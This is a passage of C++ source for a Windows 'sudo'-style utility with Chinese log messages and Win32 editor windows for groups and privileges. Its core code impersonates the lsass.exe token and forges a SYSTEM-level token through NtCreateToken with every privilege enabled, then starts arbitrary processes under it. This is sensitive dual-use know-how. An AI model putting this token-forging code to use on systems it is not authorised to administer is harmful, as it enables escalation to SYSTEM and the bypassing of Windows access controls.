        if ((g->Groups[i].Attributes & SE_GROUP_LOGON_ID) == SE_GROUP_LOGON_ID) {
            return DupSid(g->Groups[i].Sid);
        }
    }
    return NULL;
}

void TerminateParent(int parentPid, DWORD exitCode) {
    if (parentPid > 0) {
        HANDLE hParent = OpenProcess(PROCESS_TERMINATE, FALSE, (DWORD)parentPid);
        if (hParent) {
            TerminateProcess(hParent, exitCode);
            CloseHandle(hParent);
        }
    }
}

HANDLE GetLsassToken() {
    EnablePrivilege(NULL, "SeDebugPrivilege");
    DWORD lsassPid = GetPidByNameA("lsass.exe");
    if (lsassPid == 0) {
        Log(LOG_ERROR, "未找到 lsass.exe");
        return NULL;
    }
    Log(LOG_DEBUG, "打开 LSASS (PID: %d)...", lsassPid);
    HANDLE hLsassProc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, lsassPid);
    if (!hLsassProc) {
        Log(LOG_ERROR, "无法打开 LSASS");
        return NULL;
    }
    HANDLE hLsassToken = NULL;
    if (!OpenProcessToken(hLsassProc, TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_IMPERSONATE, &hLsassToken)) {
        Log(LOG_ERROR, "无法获取 LSASS 令牌");
        CloseHandle(hLsassProc);
        return NULL;
    }
    Log(LOG_SUCCESS, "LSASS Token 获取成功！");
    CloseHandle(hLsassProc);
    return hLsassToken;
}

HANDLE CreateCustomToken(DWORD targetSessionId, PSID pUserSid, const std::vector<std::string>& extraGroups) {
    Log(LOG_DEBUG, "CreateCustomToken: Session=%d", targetSessionId);

    PNtCreateToken NtCreateToken = (PNtCreateToken)GetProcAddress(
        GetModuleHandleA("ntdll.dll"), "NtCreateToken");
    if (!NtCreateToken) {
        Log(LOG_ERROR, "无法获取 NtCreateToken");
        return NULL;
    }

    if (!pUserSid || !IsValidSid(pUserSid)) {
        Log(LOG_ERROR, "无效的用户 SID");
        return NULL;
    }

    LPSTR sidStr = NULL;
    if (ConvertSidToStringSidA(pUserSid, &sidStr)) Log(LOG_INFO, "目标身份: %s", sidStr ? sidStr : "unknown");
    if (sidStr) LocalFree(sidStr);

    PSID pSidAdmins = GetSidFromString("S-1-5-32-544");
    PSID pSidAuth = GetSidFromString("S-1-5-11");
    PSID pSidEveryone = GetSidFromString("S-1-1-0");
    PSID pSidIntegrity = GetSidFromString("S-1-16-16384");
    PSID pLogonSid = GetLogonSid();

    HANDLE hThreadToken = NULL;
    OpenThreadToken(GetCurrentThread(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, FALSE, &hThreadToken);
    EnablePrivilege(hThreadToken, "SeCreateTokenPrivilege");
    EnablePrivilege(hThreadToken, "SeTcbPrivilege");
    EnablePrivilege(hThreadToken, "SeAssignPrimaryTokenPrivilege");
    CloseHandle(hThreadToken);

    std::vector<SID_AND_ATTRIBUTES> groups;
    groups.push_back({ pUserSid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_OWNER });
    if (pLogonSid) groups.push_back({ pLogonSid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_LOGON_ID });
    if (pSidAdmins) groups.push_back({ pSidAdmins, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
    if (pSidAuth) groups.push_back({ pSidAuth, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
    if (pSidEveryone) groups.push_back({ pSidEveryone, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT | SE_GROUP_MANDATORY });
    if (pSidIntegrity) groups.push_back({ pSidIntegrity, SE_GROUP_INTEGRITY | SE_GROUP_INTEGRITY_ENABLED });

    for (const auto& groupName : extraGroups) {
        PSID sid = GetSidFromString(groupName.c_str());
        if (!sid) sid = GetSidForAccountName(groupName.c_str());
        if (sid) {
            groups.push_back({ sid, SE_GROUP_ENABLED | SE_GROUP_ENABLED_BY_DEFAULT });
            Log(LOG_DEBUG, "添加组: %s", groupName.c_str());
        }
        else {
            Log(LOG_WARN, "无法解析组: %s", groupName.c_str());
        }
    }

    DWORD groupsSize = sizeof(TOKEN_GROUPS) + groups.size() * sizeof(SID_AND_ATTRIBUTES);
    PTOKEN_GROUPS pGroups = (PTOKEN_GROUPS)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, groupsSize);
    pGroups->GroupCount = (DWORD)groups.size();
    for (size_t i = 0; i < groups.size(); i++) pGroups->Groups[i] = groups[i];

    DWORD privCount = 35;
    DWORD privSize = sizeof(TOKEN_PRIVILEGES) + privCount * sizeof(LUID_AND_ATTRIBUTES);
    PTOKEN_PRIVILEGES pPrivs = (PTOKEN_PRIVILEGES)HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, privSize);
    pPrivs->PrivilegeCount = privCount;

    for (DWORD i = 0; i < privCount; i++) {
        pPrivs->Privileges[i].Luid.LowPart = i + 2;
        pPrivs->Privileges[i].Attributes = SE_PRIVILEGE_ENABLED_BY_DEFAULT | SE_PRIVILEGE_ENABLED;
    }

    TOKEN_USER tUser = { { pUserSid, 0 } };
    TOKEN_OWNER tOwner = { pUserSid };
    TOKEN_PRIMARY_GROUP tPrim = { pUserSid };
    TOKEN_SOURCE tSource;
    memcpy(tSource.SourceName, "WINSUDO\0", 8);
    AllocateLocallyUniqueId(&tSource.SourceIdentifier);
    LUID authId = { 0x3e7, 0 };
    LARGE_INTEGER exp; exp.QuadPart = -1;
    OBJECT_ATTRIBUTES  oa = { sizeof(OBJECT_ATTRIBUTES) };

    Log(LOG_DEBUG, "调用 NtCreateToken...");
    HANDLE hNewToken = NULL;
    NTSTATUS status = NtCreateToken(
        &hNewToken, TOKEN_ALL_ACCESS, &oa, TokenPrimary, &authId, &exp,
        &tUser, pGroups, pPrivs, &tOwner, &tPrim, NULL, &tSource);

    if (status != STATUS_SUCCESS) {
        Log(LOG_ERROR, "NtCreateToken 失败: 0x%08X", status);
        RevertToSelf();
        HeapFree(GetProcessHeap(), 0, pGroups);
        HeapFree(GetProcessHeap(), 0, pPrivs);
        return NULL;
    }
    Log(LOG_SUCCESS, "令牌创建成功");
    if (!SetTokenInformation(hNewToken, TokenSessionId, &targetSessionId, sizeof(DWORD))) {
        Log(LOG_WARN, "设置 SessionId 失败");
    }
    HeapFree(GetProcessHeap(), 0, pGroups);
    HeapFree(GetProcessHeap(), 0, pPrivs);
    return hNewToken;
}

BOOL ExecuteSudoOperation(
    LPSTR cmdLine,
    LPSTR identityStr,
    LPSTR desktop,
    const std::string& workingDir,
    int windowMode,
    DWORD integrityLevel,
    BOOL bUIAccess,
    const std::vector<std::string>& extraGroups,
    const std::vector<int>& DisabledPrivilege,
    const std::vector<int>& RemovePrivilege,
    PROCESS_INFORMATION* pOutPI // 可选
) {
    Log(LOG_INFO, "正在准备启动进程...");
    Log(LOG_DEBUG, "命令: %s", cmdLine);
    Log(LOG_DEBUG, "启动桌面: %s", desktop);
    Log(LOG_DEBUG, "身份: %s", identityStr);
    if (workingDir.empty()) {
        char tmp[MAX_PATH];
        GetCurrentDirectoryA(MAX_PATH, tmp);
        Log(LOG_DEBUG, "目录: %s", tmp);
    }
    else Log(LOG_DEBUG, "目录: %s", workingDir.c_str());
    if (bUIAccess) Log(LOG_DEBUG, "启用 UIAccess");
    if (integrityLevel != (DWORD)-1) Log(LOG_DEBUG, "完整性级别: 0x%06x", integrityLevel);

    DWORD sess = GetActiveSessionID();

    PSID pTargetSid = ResolveIdentity(identityStr);
    if (!pTargetSid) {
        Log(LOG_ERROR, "无法解析身份: %s", identityStr);
        return FALSE;
    }

    HANDLE hLsassToken = GetLsassToken();
    if (hLsassToken == NULL) return FALSE;

    if (!ImpersonateLoggedOnUser(hLsassToken)) {
        DWORD ErrCode = GetLastError();
        Log(LOG_ERROR, "模拟 LSASS 失败: %lu", ErrCode);
        Log_ErrorCode(LOG_WARN, ErrCode);
        CloseHandle(hLsassToken);
        return FALSE;
    }

    HANDLE hToken = CreateCustomToken(sess, pTargetSid, extraGroups);
    if (!hToken) {
        RevertToSelf();
        CloseHandle(hLsassToken);
        return FALSE;
    }

    if (bUIAccess) {
        BOOL UIAccess = TRUE;
        if (SetTokenInformation(hToken, TokenUIAccess, &UIAccess, sizeof(BOOL))) {
            Log(LOG_SUCCESS, "UI Access 标志已启用");
        } else {
            DWORD ErrCode = GetLastError();
            Log(LOG_WARN, "设置 UI Access 标志失败: %lu", ErrCode);
            Log_ErrorCode(LOG_WARN, ErrCode);
        }
    }

    if (integrityLevel != (DWORD)-1) {
        SID sid = {};
        sid.Revision = SID_REVISION;
        sid.SubAuthorityCount = 1;
        sid.IdentifierAuthority = SECURITY_MANDATORY_LABEL_AUTHORITY;
        sid.SubAuthority[0] = integrityLevel;
        TOKEN_MANDATORY_LABEL tml = {};
        tml.Label.Attributes = SE_GROUP_INTEGRITY;
        tml.Label.Sid = &sid;
        if (SetTokenInformation(hToken, TokenIntegrityLevel, &tml, sizeof(TOKEN_MANDATORY_LABEL) + sizeof(DWORD))) {
            Log(LOG_SUCCESS, "设置完整性级别成功！");
            DeleteDisabledPrivileges(hToken);
        } else {
            DWORD ErrCode = GetLastError();
            Log(LOG_WARN, "设置完整性级别失败: %lu", ErrCode);
            Log_ErrorCode(LOG_WARN, ErrCode);
        }
    }
    
    if(!RemovePrivilege.empty()) {
        for(int id : RemovePrivilege) {
            LUID_AND_ATTRIBUTES Privilege{DWORD(id + 1), SE_PRIVILEGE_REMOVED};
            TOKEN_PRIVILEGES tp{1, {DWORD(id + 1), SE_PRIVILEGE_REMOVED}};
            HANDLE tmpToken = NULL;
            if (CreateRestrictedToken(
                hToken,
                0,
                0,
                NULL,
                1,
                &Privilege,
                0,
                NULL,
                &tmpToken)) {
                hToken = tmpToken;
                Log(LOG_SUCCESS, "移除 %d 特权成功!", id);
            } else {
                DWORD ErrCode = GetLastError();
                Log(LOG_WARN, "移除 %d 特权失败: %lu", id, ErrCode);
                Log_ErrorCode(LOG_WARN, ErrCode);
            }
        }
    }
    
    if(!DisabledPrivilege.empty()) {
        for(int id : DisabledPrivilege) {
            TOKEN_PRIVILEGES tp{1, {DWORD(id + 1), 0}};
            if (AdjustTokenPrivileges(hToken,
                FALSE,
                &tp,
                sizeof(tp),
                NULL,
                NULL)) {
                Log(LOG_SUCCESS, "禁用 %d 特权成功!", id);
            } else {
                DWORD ErrCode = GetLastError();
                Log(LOG_WARN, "禁用 %d 特权失败: %lu", id, ErrCode);
                Log_ErrorCode(LOG_WARN, ErrCode);
            }
        }
    }

    LPVOID lpEnv = NULL;
    CreateEnvironmentBlock(&lpEnv, hToken, FALSE);

    STARTUPINFOA si = { sizeof(si) };
    si.lpDesktop = desktop;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = windowMode;
    PROCESS_INFORMATION pi = { 0 };
    DWORD dwCreationFlags = CREATE_UNICODE_ENVIRONMENT | CREATE_NEW_CONSOLE;
    LPCSTR lpCurrentDir = workingDir.empty() ? NULL : workingDir.c_str();

    BOOL success = CreateProcessAsUserA(
        hToken, NULL, cmdLine, NULL, NULL, FALSE,
        dwCreationFlags, lpEnv, lpCurrentDir, &si, &pi
    );

    RevertToSelf();
    CloseHandle(hLsassToken);
    if (lpEnv) DestroyEnvironmentBlock(lpEnv);
    CloseHandle(hToken);

    if (success) {
        Log(LOG_SUCCESS, "进程启动成功! PID: %lu", pi.dwProcessId);
        if (pOutPI) *pOutPI = pi;
        else {
            CloseHandle(pi.hProcess);
            CloseHandle(pi.hThread);
        }
        return TRUE;
    }
    else {
        DWORD err = GetLastError();
        Log(LOG_ERROR, "进程创建失败: %lu", err);
        Log_ErrorCode(LOG_ERROR, err);
        return FALSE;
    }
}

// ==========================================
// GUI 实现: 组编辑器窗口 (重写版)
// ==========================================

#define ID_LISTVIEW_GROUPS 2001
#define ID_BTN_ADD_GRP     2002
#define ID_BTN_DEL_GRP     2003
#define ID_BTN_EDIT_GRP    2004

// 辅助函数：添加新组
void AddNewGroupItem(HWND hList) {
    int count = ListView_GetItemCount(hList);
    LVITEMA lvi = { 0 };
    lvi.mask = LVIF_TEXT;
    lvi.iItem = count;
    lvi.pszText = (LPSTR)""; 
    int idx = ListView_InsertItem(hList, &lvi);
    ListView_EnsureVisible(hList, idx, FALSE);
    SetFocus(hList);
    ListView_EditLabel(hList, idx);
}
void DeleteSelectedGroup(HWND hList) {
    int iItem = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
    if (iItem != -1) ListView_DeleteItem(hList, iItem);
}
void EditSelectedGroup(HWND hList) {
    int iItem = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
    if (iItem != -1) { SetFocus(hList); ListView_EditLabel(hList, iItem); }
}

LRESULT CALLBACK GroupEditorWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hList;
    switch (msg) {
        case WM_CREATE: {
            HFONT hFont = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");
            hList = CreateWindowExA(0, WC_LISTVIEW, "", WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT | LVS_NOCOLUMNHEADER | LVS_EDITLABELS | LVS_SHOWSELALWAYS, 10, 10, 200, 500, hwnd, (HMENU)ID_LISTVIEW_GROUPS, GetModuleHandle(NULL), NULL);
            ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
            SendMessageA(hList, WM_SETFONT, (WPARAM)hFont, TRUE);
            LVCOLUMNA lvc = { 0 }; lvc.mask = LVCF_WIDTH; lvc.cx = 190;
            ListView_InsertColumn(hList, 0, &lvc);
            for (size_t i = 0; i < extraGroups.size(); i++) {
                LVITEMA lvi = { 0 }; lvi.mask = LVIF_TEXT; lvi.iItem = (int)i; lvi.pszText = (LPSTR)extraGroups[i].c_str();
                ListView_InsertItem(hList, &lvi);
            }
            HWND hBtnAdd = CreateWindow("BUTTON", "新建 (New)", WS_CHILD | WS_VISIBLE, 220, 10, 90, 30, hwnd, (HMENU)ID_BTN_ADD_GRP, NULL, NULL);
            SendMessageA(hBtnAdd, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hBtnEdit = CreateWindow("BUTTON", "编辑 (Edit)", WS_CHILD | WS_VISIBLE, 220, 50, 90, 30, hwnd, (HMENU)ID_BTN_EDIT_GRP, NULL, NULL);
            SendMessageA(hBtnEdit, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hBtnDel = CreateWindow("BUTTON", "删除 (Del)", WS_CHILD | WS_VISIBLE, 220, 90, 90, 30, hwnd, (HMENU)ID_BTN_DEL_GRP, NULL, NULL);
            SendMessageA(hBtnDel, WM_SETFONT, (WPARAM)hFont, TRUE);
            SetFocus(hList);
            break;
        }
        case WM_SIZE: {
            int w = LOWORD(lParam), h = HIWORD(lParam);
            if (w > 120 && h > 60) {
                MoveWindow(hList, 10, 10, w - 120, h - 50, TRUE);
                ListView_SetColumnWidth(hList, 0, w - 125);
                int btnX = w - 100;
                MoveWindow(GetDlgItem(hwnd, ID_BTN_ADD_GRP), btnX, 10, 90, 30, TRUE);
                MoveWindow(GetDlgItem(hwnd, ID_BTN_EDIT_GRP), btnX, 50, 90, 30, TRUE);
                MoveWindow(GetDlgItem(hwnd, ID_BTN_DEL_GRP), btnX, 90, 90, 30, TRUE);
            }
            break;
        }
        case WM_COMMAND: {
            int id = LOWORD(wParam);
            switch (id) {
            case ID_BTN_ADD_GRP: AddNewGroupItem(hList); break;
            case ID_BTN_DEL_GRP: DeleteSelectedGroup(hList); break;
            case ID_BTN_EDIT_GRP: EditSelectedGroup(hList); break;
            }
            break;
        }
        case WM_NOTIFY: {
            LPNMHDR pnmh = (LPNMHDR)lParam;
            if (pnmh->hwndFrom == hList) {
                switch (pnmh->code) {
                case NM_DBLCLK: { LPNMITEMACTIVATE pia = (LPNMITEMACTIVATE)lParam; if (pia->iItem != -1) ListView_EditLabel(hList, pia->iItem); else AddNewGroupItem(hList); break; }
                case LVN_KEYDOWN: { LPNMLVKEYDOWN pnkd = (LPNMLVKEYDOWN)lParam; if (pnkd->wVKey == VK_DELETE) DeleteSelectedGroup(hList); break; }
                case LVN_ENDLABELEDIT: {
                    NMLVDISPINFOA* pdi = (NMLVDISPINFOA*)lParam;
                    if (pdi->item.pszText != NULL) {
                        if (strlen(pdi->item.pszText) == 0) { PostMessage(hList, LVM_DELETEITEM, pdi->item.iItem, 0); return FALSE; }
                        ListView_SetItemText(hList, pdi->item.iItem, 0, pdi->item.pszText); return TRUE;
                    }
                    else {
                        char buf[256] = { 0 }; ListView_GetItemText(hList, pdi->item.iItem, 0, buf, 255);
                        if (strlen(buf) == 0) PostMessage(hList, LVM_DELETEITEM, pdi->item.iItem, 0);
                    }
                    return FALSE;
                }
                }
            }
            break;
        }
        case WM_CLOSE: {
            extraGroups.clear();
            int count = ListView_GetItemCount(hList);
            char buf[256];
            for (int i = 0; i < count; i++) {
                ListView_GetItemText(hList, i, 0, buf, 255);
                if (strlen(buf) > 0) extraGroups.push_back(buf);
            }
            HWND hParent = GetParent(hwnd);
            if (hParent && IsWindow(hParent)) {
                HWND hEditGrp = GetDlgItem(hParent, 1014); // ID_EDIT_GROUPS
                if (hEditGrp) {
                    if (extraGroups.empty()) SetWindowTextA(hEditGrp, "");
                    else if (extraGroups.size() == 1) SetWindowTextA(hEditGrp, extraGroups[0].c_str());
                    else { std::string txt = extraGroups[0] + "..."; SetWindowTextA(hEditGrp, txt.c_str()); }
                }
            }
            DestroyWindow(hwnd);
            break;
        }
        case WM_DESTROY: PostQuitMessage(0); break;
        default: return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void ShowGroupEditor(HWND hParent) {
    if (g_hGroupEditor && IsWindow(g_hGroupEditor)) { 
        SetForegroundWindow(g_hGroupEditor); 
        return; 
    }
    WNDCLASSEXA wc = { 0 }; 
    wc.cbSize = sizeof(wc); 
    wc.lpfnWndProc = GroupEditorWndProc; 
    wc.hInstance = GetModuleHandle(NULL);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW); wc.hbrBackground = (HBRUSH)(COLOR_WINDOW); wc.lpszClassName = "WinSudoGroupEdit";
    RegisterClassExA(&wc);
    EnableWindow(hParent, FALSE);
    g_hGroupEditor = CreateWindowExA(WS_EX_DLGMODALFRAME, "WinSudoGroupEdit", "组编辑器", WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 340, 500, hParent, NULL, GetModuleHandle(NULL), NULL);
    SetFocus(g_hGroupEditor);
    MSG msg; 
    while (GetMessage(&msg, NULL, 0, 0)) { 
        TranslateMessage(&msg); DispatchMessage(&msg); 
    }
    g_hGroupEditor = NULL; 
    EnableWindow(hParent, TRUE); 
    SetForegroundWindow(hParent);
}

// ==========================================
// GUI 实现: 特权编辑器窗口 (新增)
// ==========================================

const char* AllPrivileges[] = {
    "SeCreateTokenPrivilege",
    "SeAssignPrimaryTokenPrivilege",
    "SeLockMemoryPrivilege",
    "SeIncreaseQuotaPrivilege",
    "SeMachineAccountPrivilege",
    "SeTcbPrivilege",
    "SeSecurityPrivilege",
    "SeTakeOwnershipPrivilege",
    "SeLoadDriverPrivilege",
    "SeSystemProfilePrivilege",
    "SeSystemtimePrivilege",
    "SeProfileSingleProcessPrivilege",
    "SeIncreaseBasePriorityPrivilege",
    "SeCreatePagefilePrivilege",
    "SeCreatePermanentPrivilege",
    "SeBackupPrivilege",
    "SeRestorePrivilege",
    "SeShutdownPrivilege",
    "SeDebugPrivilege",
    "SeAuditPrivilege",
    "SeSystemEnvironmentPrivilege",
    "SeChangeNotifyPrivilege",
    "SeRemoteShutdownPrivilege",
    "SeUndockPrivilege",
    "SeSyncAgentPrivilege",
    "SeEnableDelegationPrivilege",
    "SeManageVolumePrivilege",
    "SeImpersonatePrivilege",
    "SeCreateGlobalPrivilege",
    "SeTimeZonePrivilege",
    "SeCreateSymbolicLinkPrivilege",
    "SeRelabelPrivilege",
    "SeIncreaseWorkingSetPrivilege",
    "SeTrustedCredManAccessPrivilege",
    "SeDelegateSessionUserImpersonatePrivilege"
};


#define ID_LISTVIEW_PRIVS 3001
#define ID_BTN_RESET      3002
#define ID_BTN_DISABLE    3003
#define ID_BTN_REMOVE     3004

void UpdatePrivStatus(HWND hList, int iItem, const char* status) {
    ListView_SetItemText(hList, iItem, 1, (LPSTR)status);
}

void SetSelectedPrivs(HWND hList, const char* status) {
    int iPos = ListView_GetNextItem(hList, -1, LVNI_SELECTED);
    while (iPos != -1) {
        UpdatePrivStatus(hList, iPos, status);
        iPos = ListView_GetNextItem(hList, iPos, LVNI_SELECTED);
    }
    SetFocus(hList);
}

LRESULT CALLBACK PrivilegeEditorWndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hList;
    switch (msg) {
        case WM_CREATE: {
            HFONT hFont = CreateFontA(16, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE, ANSI_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS, DEFAULT_QUALITY, DEFAULT_PITCH | FF_SWISS, "Segoe UI");

            hList = CreateWindowExA(0, WC_LISTVIEW, "", 
                WS_CHILD | WS_VISIBLE | WS_BORDER | LVS_REPORT | LVS_SHOWSELALWAYS, 
                10, 10, 350, 340, hwnd, (HMENU)ID_LISTVIEW_PRIVS, GetModuleHandle(NULL), NULL);
            ListView_SetExtendedListViewStyle(hList, LVS_EX_FULLROWSELECT | LVS_EX_GRIDLINES);
            SendMessageA(hList, WM_SETFONT, (WPARAM)hFont, TRUE);

            LVCOLUMNA lvc = { 0 };
            lvc.mask = LVCF_WIDTH | LVCF_TEXT;
            lvc.cx = 260; lvc.pszText = (LPSTR)"Privilege Name";
            ListView_InsertColumn(hList, 0, &lvc);
            lvc.cx = 100; lvc.pszText = (LPSTR)"Status";
            ListView_InsertColumn(hList, 1, &lvc);
            
            int PrivilegesStatus[35] = {}; // 0: Default, 1: Disabled, 2:Removed
            for(int id : DisabledPrivilege)PrivilegesStatus[id - 1] = 1;
            for(int id : RemovePrivilege)PrivilegesStatus[id - 1] = 2;

            // 填充特权列表
            for (int i = 0; i < 35; i++) {
                LVITEMA lvi = { 0 };
                lvi.mask = LVIF_TEXT | LVIF_PARAM;
                lvi.iItem = i;
                lvi.pszText = (LPSTR)AllPrivileges[i];
                lvi.lParam = i + 1;
                ListView_InsertItem(hList, &lvi);

                // 检查当前状态
                const char* status = "Default";
                if(PrivilegesStatus[i] == 1)status = "Disabled";
                else if(PrivilegesStatus[i] == 2)status = "Removed";
                ListView_SetItemText(hList, i, 1, (LPSTR)status);
            }

            int btnX = 370;
            HWND hBtnReset = CreateWindow("BUTTON", "重置 (Default)", WS_CHILD | WS_VISIBLE, btnX, 10, 110, 30, hwnd, (HMENU)ID_BTN_RESET, NULL, NULL);
            SendMessageA(hBtnReset, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hBtnDisable = CreateWindow("BUTTON", "禁用 (Disable)", WS_CHILD | WS_VISIBLE, btnX, 50, 110, 30, hwnd, (HMENU)ID_BTN_DISABLE, NULL, NULL);
            SendMessageA(hBtnDisable, WM_SETFONT, (WPARAM)hFont, TRUE);
            HWND hBtnRemove = CreateWindow("BUTTON", "移除 (Remove)", WS_CHILD | WS_VISIBLE, btnX, 90, 110, 30, hwnd, (HMENU)ID_BTN_REMOVE, NULL, NULL);
            SendMessageA(hBtnRemove, WM_SETFONT, (WPARAM)hFont, TRUE);

            SetFocus(hList);
            break;
        }
        case WM_SIZE: {
            int w = LOWORD(lParam), h = HIWORD(lParam);
            if (w > 150 && h > 60) {
                MoveWindow(hList, 10, 10, w - 140, h - 50, TRUE);
                int btnX = w - 125;
                MoveWindow(GetDlgItem(hwnd, ID_BTN_RESET), btnX, 10, 110, 30, TRUE);
                MoveWindow(GetDlgItem(hwnd, ID_BTN_DISABLE), btnX, 50, 110, 30, TRUE);
                MoveWindow(GetDlgItem(hwnd, ID_BTN_REMOVE), btnX, 90, 110, 30, TRUE);
            }
            break;
        }
        case WM_COMMAND: {
            int id = LOWORD(wParam);
            switch (id) {
                case ID_BTN_RESET: SetSelectedPrivs(hList, "Default"); break;
                case ID_BTN_DISABLE: SetSelectedPrivs(hList, "Disabled"); break;
                case ID_BTN_REMOVE: SetSelectedPrivs(hList, "Removed"); break;
            }
            break;
        }
        case WM_CLOSE: {
            RemovePrivilege.clear();
            DisabledPrivilege.clear();
            
            int count = ListView_GetItemCount(hList);
            char statusBuf[32];
            for (int i = 0; i < count; i++) {
                ListView_GetItemText(hList, i, 1, statusBuf, 31);
                LVITEMA lvi = {0};
                lvi.iItem = i;
                lvi.mask = LVIF_PARAM;
                ListView_GetItem(hList, &lvi);
                int privId = (int)lvi.lParam;

                if (strcmp(statusBuf, "Removed") == 0) RemovePrivilege.push_back(privId);
                else if (strcmp(statusBuf, "Disabled") == 0) DisabledPrivilege.push_back(privId);
            }

            // 更新父窗口摘要
            HWND hParent = GetParent(hwnd);
            if (hParent && IsWindow(hParent)) {
                HWND hEditPriv = GetDlgItem(hParent, 1015); // ID_EDIT_PRIVS
                if (hEditPriv) {
                    char summary[128];
                    if (RemovePrivilege.empty() && DisabledPrivilege.empty()) strcpy(summary, "Default (All Enabled)");
                    else sprintf(summary, "%d Removed, %d Disabled", (int)RemovePrivilege.size(), (int)DisabledPrivilege.size());
                    SetWindowTextA(hEditPriv, summary);
                }
            }
            DestroyWindow(hwnd);
            break;
        }
        case WM_DESTROY: 
            PostQuitMessage(0); break;
        default: 
            return DefWindowProc(hwnd, msg, wParam, lParam);
    }
    return 0;
}

void ShowPrivilegeEditor(HWND hParent) {
    if (g_hPrivEditor && IsWindow(g_hPrivEditor)) { 
        SetForegroundWindow(g_hPrivEditor); 
        return; 
    }
    WNDCLASSEXA wc = { 0 }; 
    wc.cbSize = sizeof(wc); 
    wc.lpfnWndProc = PrivilegeEditorWndProc; 
    wc.hInstance = GetModuleHandle(NULL);
    wc.hCursor = LoadCursor(NULL, IDC_ARROW); 
    wc.hbrBackground = (HBRUSH)(COLOR_WINDOW); 
    wc.lpszClassName = "WinSudoPrivEdit";
    RegisterClassExA(&wc);
    EnableWindow(hParent, FALSE);
    g_hPrivEditor = CreateWindowExA(WS_EX_DLGMODALFRAME, "WinSudoPrivEdit", "特权编辑器", WS_POPUP | WS_CAPTION | WS_SYSMENU | WS_VISIBLE, CW_USEDEFAULT, CW_USEDEFAULT, 520, 500, hParent, NULL, GetModuleHandle(NULL), NULL);
    SetFocus(g_hPrivEditor);
    MSG msg; while (GetMessage(&msg, NULL, 0, 0)) { TranslateMessage(&msg); DispatchMessage(&msg); }
    g_hPrivEditor = NULL; EnableWindow(hParent, TRUE); SetForegroundWindow(hParent);
}


// ==========================================
// GUI 实现: 主窗口
// ==========================================

#define ID_BTN_RUN 1001
#define ID_BTN_CANCEL 1002
#define ID_EDIT_CMD 1003
#define ID_COMBO_USER 1004
#define ID_COMBO_IL 1005
#define ID_CHECK_UIACCESS 1007
#define ID_CHECK_DEBUG 1009
#define ID_EDIT_DESKTOP 1010
#define ID_EDIT_DIR 1011
#define ID_COMBO_MODE 1012
#define ID_EDIT_LOG 1013
#define ID_EDIT_GROUPS 1014
#define ID_EDIT_PRIVS 1015
#define ID_BTN_CMD_BROWSE 1016
#define ID_BTN_DIR_BROWSE 1017
#define ID_COMBO_PRESET 1018 // [新增] 预设下拉框 ID

WNDPROC OldEditProc, OldPrivEditProc;

LRESULT CALLBACK SubclassGroupsProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_LBUTTONUP) { ReleaseCapture(); ShowGroupEditor(GetParent(hwnd)); return 0; }
    return CallWindowProc(OldEditProc, hwnd, msg, wParam, lParam);
}

LRESULT CALLBACK SubclassPrivsProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    if (msg == WM_LBUTTONUP) { ReleaseCapture(); ShowPrivilegeEditor(GetParent(hwnd)); return 0; }
    return CallWindowProc(OldPrivEditProc, hwnd, msg, wParam, lParam);
}

// 辅助函数：更新 GUI 中的摘要文本
void UpdateGuiSummaries(HWND hEditGroups, HWND hEditPrivs) {
    // 更新组摘要
    if (extraGroups.empty()) SetWindowTextA(hEditGroups, "");
    else if (extraGroups.size() == 1) SetWindowTextA(hEditGroups, extraGroups[0].c_str());
    else { std::string txt = extraGroups[0] + "..."; SetWindowTextA(hEditGroups, txt.c_str()); }

    // 更新特权摘要
    char summary[128];
    if (RemovePrivilege.empty() && DisabledPrivilege.empty()) strcpy(summary, "Default (All Enabled)");
    else sprintf(summary, "%d Removed, %d Disabled", (int)RemovePrivilege.size(), (int)DisabledPrivilege.size());
    SetWindowTextA(hEditPrivs, summary);
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
    static HWND hEditCmd, hComboUser, hComboPreset, hComboIL, hCheckUIAccess, hCheckDebug;
    static HWND hEditDesktop, hEditDir, hComboMode, hEditGroups, hEditPrivs;

    switch (msg) {
        case WM_CREATE: {
            INITCOMMONCONTROLSEX icex; icex.dwSize = sizeof(INITCOMMONCONTROLSEX); icex.dwICC = ICC_LISTVIEW_CLASSES; InitCommonControlsEx(&icex);
